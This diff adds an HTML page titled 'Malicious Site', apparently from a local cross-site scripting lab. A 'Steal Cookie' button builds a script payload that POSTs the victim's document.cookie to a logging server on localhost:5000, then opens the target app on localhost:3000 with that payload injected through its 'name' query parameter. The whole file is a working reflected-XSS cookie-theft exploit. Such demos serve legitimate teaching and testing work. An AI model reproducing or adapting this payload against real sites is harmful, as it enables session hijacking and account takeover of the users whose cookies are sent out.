@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Site</title>
+</head>
+<body>
+    <h1>This is a fake site!</h1>
+
+    <button onclick="steal()">Steal Cookie</button>
+
+    <script>
+        function steal() {
+            const payload = `<script>fetch('http://localhost:5000/log',{method:'POST',body:document.cookie})<\/script>`;
+            const attackUrl = "http://localhost:3000/?name=" + encodeURIComponent(payload);
+
+            window.open(attackUrl, "_blank");
+        }
+    </script>
+</body>
+</html>
